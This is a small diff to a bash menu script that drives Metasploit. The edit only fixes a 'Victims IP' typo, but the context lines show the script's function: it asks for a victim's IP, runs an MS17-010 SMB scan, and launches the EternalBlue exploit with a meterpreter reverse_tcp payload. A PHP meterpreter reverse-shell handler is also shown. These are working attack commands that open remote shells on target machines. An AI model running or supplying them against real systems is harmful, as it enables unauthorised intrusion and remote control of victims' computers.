@@ -143,7 +143,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/revers
 
 
 elif [ "$x" == "$scan" ]; then                        #SCAN
-echo "Victims IP:"
+echo "Victim's IP:"
 read r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
@@ -156,7 +156,7 @@ read
 elif [ "$x" == "$eternalblue" ]; then                        #ETERNALBLUE
 echo 'Your IP:'
 read l
-echo "Victims IP:"
+echo "Victim's IP:"
 read r
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $l ; set rhost $r ; exploit ; "
